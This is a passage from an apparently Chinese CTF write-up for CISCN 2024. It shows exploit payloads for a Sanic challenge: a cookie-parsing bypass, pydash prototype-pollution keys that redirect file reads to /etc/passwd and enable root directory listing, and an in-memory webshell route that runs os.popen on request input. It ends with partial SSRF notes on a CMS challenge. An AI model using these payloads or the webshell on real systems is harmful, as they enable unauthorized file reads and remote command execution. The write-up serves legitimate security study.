number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span> <span class="token keyword">and</span> value<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>  <span class="token comment"># no cov</span>            value <span class="token operator">=</span> _unquote<span class="token punctuation">(</span>value<span class="token punctuation">)</span>        <span class="token keyword">if</span> name <span class="token keyword">in</span> cookies<span class="token punctuation">:</span>            cookies<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>value<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            cookies<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>value<span class="token punctuation">]</span>    <span class="token keyword">return</span> cookies<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现这里确实会通过<code>;</code>来将原始字符串分割成多个子字符串，跟进一下匹配的规则</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">COOKIE_NAME_RESERVED_CHARS <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>    <span class="token string">'[\x00-\x1F\x7F-\xFF()&lt;>@,;:\\\\"/[\\]?=&#123;&#125; \x09]'</span><span class="token punctuation">)</span>OCTAL_PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"\\[0-3][0-7][0-7]"</span><span class="token punctuation">)</span>QUOTE_PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"[\\]."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现这里的匹配只匹配0到7，也就是说我们可以用八进制来绕过，python会自动转义八进制<strong>字符串</strong></p><p><img src="/blog/2024/05/18/CISCN2024/image-20240520195333927.png" alt="image-20240520195333927"></p><p>那么cookie为</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">user="adm\073n"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意必须要引号</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240520194523756.png" alt="image-20240520194523756"></p><p><img src="/blog/2024/05/18/CISCN2024/image-20240520195633426.png" alt="image-20240520195633426"></p><p>接下来就能进admin路由了</p><p>&#x2F;admin路由</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span>        value <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> key <span class="token keyword">and</span> value <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span> <span class="token keyword">and</span> <span class="token string">'_.'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>            pollute <span class="token operator">=</span> Pollute<span class="token punctuation">(</span><span class="token punctuation">)</span>            pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>pollute<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pydash原型链污染"><a href="#pydash原型链污染" class="headerlink" title="pydash原型链污染"></a>pydash原型链污染</h3><p>pydash &#x3D;&#x3D; 5.1.2，有<a href="https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca">CVE-2023-26145</a>和pydash原型链污染，因为这里用了<code>pydash.set_</code>，那么应该是原型链污染</p><p>参考文章：<a href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/</a></p><p>这里过滤了<code>_.</code>，常规的方法感觉都绕不过去，既然这里选择了pydash那么我们再翻翻pydash的源码看一下</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240520200933130.png" alt="image-20240520200933130"></p><p>发现这里可以利用多次转义的操作最终解析出<code>.</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">_\\\\<span class="token punctuation">.</span>_\\<span class="token punctuation">.</span>_\<span class="token punctuation">.</span>_<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="污染-file"><a href="#污染-file" class="headerlink" title="污染__file__"></a>污染__file__</h3><p>而提到python的原型链污染，想起了之前<a href="https://c1oudfl0w0.github.io/blog/2023/07/25/DASCTF-2023-0X401/#%E9%9D%9E%E9%A2%84%E6%9C%9F-%E6%B1%A1%E6%9F%93-static-folder%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">dasctf &amp; 0X401 EzFlask</a>里面pop神污染静态文件变量的操作</p><p>这里也可以，尝试污染<code>__file__</code></p><p><img src="/blog/2024/05/18/CISCN2024/image-20240520211135998.png" alt="image-20240520211135998"></p><p>payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__init__\\\\.__globals__\\\\.__file__"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240520203731670.png" alt="image-20240520203731670"></p><p><img src="/blog/2024/05/18/CISCN2024/image-20240520203743979.png" alt="image-20240520203743979"></p><p>ctfshow的复现环境可以直接读<code>/proc/1/environ</code>获取环境变量里的flag</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240520203843029.png" alt="image-20240520203843029"></p><h3 id="寻找污染链"><a href="#寻找污染链" class="headerlink" title="寻找污染链"></a>寻找污染链</h3><p>正确的做法貌似最终需要列出目录，污染<code>static</code>的<code>DirectoryHandler</code>和<code>directory_view</code>和<code>_parts</code>为<code>True</code>和<code>/</code></p><p>即目标是<code>app.static(&quot;/static/&quot;, &quot;./static/&quot;)</code></p><p><img src="/blog/2024/05/18/CISCN2024/image-20240520205253702.png" alt="image-20240520205253702"></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"__init__\\\\.__globals__\\\\.app.signal_router._future_statics.1857365850384.11"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token string">"True"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"__init__\\\\.__globals__\\\\.app.signal_router._future_statics.1857365850384.10"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token string">"True"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是参数太多了，调试根本看不过来，上面那串数字估计是随机的。。。</p><p>还是得回到sanic的源码，f12直接跟进</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">static</span><span class="token punctuation">(</span>    self<span class="token punctuation">,</span>    uri<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>    file_or_directory<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>PathLike<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    pattern<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">r"/?.+"</span><span class="token punctuation">,</span>    use_modified_since<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>    use_content_range<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>    stream_large_files<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>    name<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"static"</span><span class="token punctuation">,</span>    host<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>    strict_slashes<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>    content_type<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>    <span class="token builtin">apply</span><span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>    resource_type<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>    index<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Sequence<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>    directory_view<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>    directory_handler<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>DirectoryHandler<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数有这些，在底下对参数的注释中看到</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523000326648.png" alt="image-20240523000326648"></p><p><code>directory_view</code>为True时，会开启列目录功能；而<code>directory_handler</code>中可以获取指定的目录</p><p>跟进<code>directory_handler</code></p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523000516400.png" alt="image-20240523000516400"></p><p>发现调用了<code>DirectoryHandler</code>类，继续跟进</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">DirectoryHandler</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Serve files from a directory.    Args:        uri (str): The URI to serve the files at.        directory (Path): The directory to serve files from.        directory_view (bool): Whether to show a directory listing or not.        index (Optional[Union[str, Sequence[str]]]): The index file(s) to            serve if the directory is requested. Defaults to None.    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>        self<span class="token punctuation">,</span>        uri<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>        directory<span class="token punctuation">:</span> Path<span class="token punctuation">,</span>        directory_view<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>        index<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Sequence<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            index <span class="token operator">=</span> <span class="token punctuation">[</span>index<span class="token punctuation">]</span>        <span class="token keyword">elif</span> index <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>base <span class="token operator">=</span> uri<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>directory <span class="token operator">=</span> directory        self<span class="token punctuation">.</span>directory_view <span class="token operator">=</span> directory_view        self<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么只要让参数<code>directory</code>为<code>/</code>，<code>directory_view</code>为True，就可以看到根目录的所有文件了</p><p>现在我们开始本地调试，为了方便，把前面session判断的那些源码全部注释掉，再加入一个eval方便打印信息</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sanic <span class="token keyword">import</span> Sanic<span class="token keyword">from</span> sanic<span class="token punctuation">.</span>response <span class="token keyword">import</span> text<span class="token punctuation">,</span> html<span class="token comment">#from sanic_session import Session</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> pydash<span class="token comment"># pydash==5.1.2</span><span class="token keyword">class</span> <span class="token class-name">Pollute</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>app <span class="token operator">=</span> Sanic<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>static<span class="token punctuation">(</span><span class="token string">"/static/"</span><span class="token punctuation">,</span> <span class="token string">"./static/"</span><span class="token punctuation">)</span><span class="token comment">#Session(app)</span><span class="token comment">#@app.route('/', methods=['GET', 'POST'])</span><span class="token comment">#async def index(request):</span>    <span class="token comment">#return html(open('static/index.html').read())</span><span class="token comment">#@app.route("/login")</span><span class="token comment">#async def login(request):</span>    <span class="token comment">#user = request.cookies.get("user")</span>    <span class="token comment">#if user.lower() == 'adm;n':</span>        <span class="token comment">#request.ctx.session['admin'] = True</span>        <span class="token comment">#return text("login success")</span>    <span class="token comment">#return text("login fail")</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/src"</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">eval</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span>    value <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> key <span class="token keyword">and</span> value <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span> <span class="token keyword">and</span> <span class="token string">'_.'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>        pollute <span class="token operator">=</span> Pollute<span class="token punctuation">(</span><span class="token punctuation">)</span>        pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>pollute<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>        <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span><span class="token comment">#print(app.router.name_index['name'].directory_view)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调试的时候发现有<code>app.router.name_index</code>可以获取注册的路由，因为之前没找到<code>app.static</code>变量于是猜测得从注册路由这里下手</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523002319518.png" alt="image-20240523002319518"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>src?a<span class="token operator">=</span><span class="token keyword">print</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>router<span class="token punctuation">.</span>name_index<span class="token punctuation">)</span><span class="token comment">#&#123;'__mp_main__.static': &lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path>>, '__mp_main__.src': &lt;Route: name=__mp_main__.src path=src>, '__mp_main__.admin': &lt;Route: name=__mp_main__.admin path=admin>&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那么访问对应的键值就能访问到其路由，接下来想办法进到<code>DirectoryHandler</code></p><p>在sanic的几个库里面全局搜一下<code>name_index</code>方法</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523004218935.png" alt="image-20240523004218935"></p><p>找到系统默认的调用点，然后下断点调试（vscode调试第三方库参考<a href="https://blog.csdn.net/zlb872551601/article/details/105354738">https://blog.csdn.net/zlb872551601/article/details/105354738</a>）</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523010018167.png" alt="image-20240523010018167"></p><p>从handler入手，可以发现<code>directory_handler</code>中的<code>directory</code>和<code>directory_view</code>变量</p><p>这里的name要多跟进几次得到<code>__mp_main__.static</code>（或许是因为此时sanic服务才正式启动？，又或者这个才是最后覆盖static变量的name？）</p><p>于是连上我们前面的链子：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>router<span class="token punctuation">.</span>name_index<span class="token punctuation">[</span><span class="token string">'__mp_main__.static'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>handler<span class="token punctuation">.</span>keywords<span class="token punctuation">[</span><span class="token string">'directory_handler'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240523010432983.png" alt="image-20240523010432983"></p><p>这样就能获取<code>directory</code>和<code>directory_view</code>的值了</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523010611341.png" alt="image-20240523010611341"></p><p>于是就能进行污染了</p><h4 id="污染directory-view"><a href="#污染directory-view" class="headerlink" title="污染directory_view"></a>污染directory_view</h4><p>payload：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token string">"True"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意这里不能用<code>[]</code>来包裹其中的索引，污染和直接调用不同，我们需要用<code>.</code>来连接；而<code>__mp_main__</code>是一个整体，不能分开，用两个反斜杠转义即可</p><p>改为True后就可以访问到<code>/static/</code>下的文件了</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523011600831.png" alt="image-20240523011600831"></p><h4 id="污染directory"><a href="#污染directory" class="headerlink" title="污染directory"></a>污染directory</h4><p>接下来污染<code>directory</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"d:"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次访问返回500，报错</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523011908163.png" alt="image-20240523011908163"></p><p>很明显不能直接将这里的值污染为一个字符串类型</p><p>我们回到前面调试sanic库的部分</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523012203237.png" alt="image-20240523012203237"></p><p>这里的directory是一个对象，而值则由其中的<strong>parts</strong>属性决定，但是这个属性是一个tuple，不能直接污染，回到前面的DirectoryHandler类的源码寻找办法</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523012449560.png" alt="image-20240523012449560"></p><p>这里的directory参数是一个Path对象，跟进Path类</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523012633968.png" alt="image-20240523012633968"></p><p>继续跟进<code>_from_parts</code>方法</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523012705002.png" alt="image-20240523012705002"></p><p>可以看到<code>parts</code>的值最后是给了<code>_parts</code>这个属性</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523012810707.png" alt="image-20240523012810707"></p><p>这是一个list，那么这里很明显我们就可以直接污染了，payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"d:"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240523013602083.png" alt="image-20240523013602083"></p><h4 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"True"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"/"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240523014010104.png" alt="image-20240523014010104"></p><p>然后污染<code>__file__</code>为flag的名称，再访问&#x2F;src得到flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__init__\\\\.__globals__\\\\.__file__"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"/24bcbd0192e591d6ded1_flag"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="其它文件读取的方法"><a href="#其它文件读取的方法" class="headerlink" title="其它文件读取的方法"></a>其它文件读取的方法</h3><p>gxn师傅tql！</p><p>类似于flask中的<code>_static_url_path</code>，污染了以后可以通过路由直接访问到文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token string">"/"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p>累了，直接搬gxn师傅的图了（</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240523014519823.png" alt="image-20240523014519823"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'app.add_route(lambda request: __import__("os").popen(request.args.get("gxngxngxn")).read(),"/gxngxngxn", methods=["GET", "POST"])'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240523014542230.png" alt="image-20240523014542230"></p><p>于是在报错中回成功会回显命令的执行结果（或许可以在pickle条件下使用？</p><hr><h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>怎么看了半天有三种解法了？？？</p><p>第一天晚上专门审了下源码里ssrf的洞，第二天早上看到题目直接狂喜，以为要找另一个ssrf的洞，没想到根本不是。。</p><p>说是ban了第一天的洞，不过还是要打ssrf，猜测ban的是qrcode那个路由</p><p>那就继续看看其它调用了<code>dr_catcher_data</code>的方法</p><p>Run.php</p><p>访问<code>/index.php?s=api&amp;c=run&amp;m=cron?auth=a</code>，然后显示控制器不存在过不去了。。</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240519101255367.png" alt="image-20240519101255367"></p><p>Phpcmf.php</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240519111725580.png" alt="image-20240519111725580"></p><p>不可控，算了</p><p>Upload.php</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240519100016530.png" alt="image-20240519100016530"></p><p><img src="/blog/2024/05/18/CISCN2024/image-20240519100046903.png" alt="image-20240519100046903"></p><p>看起来能打但是一开始调用了<code>_get_upload_params</code>验权限，所以不行</p><p>Image.php</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240519111253356.png" 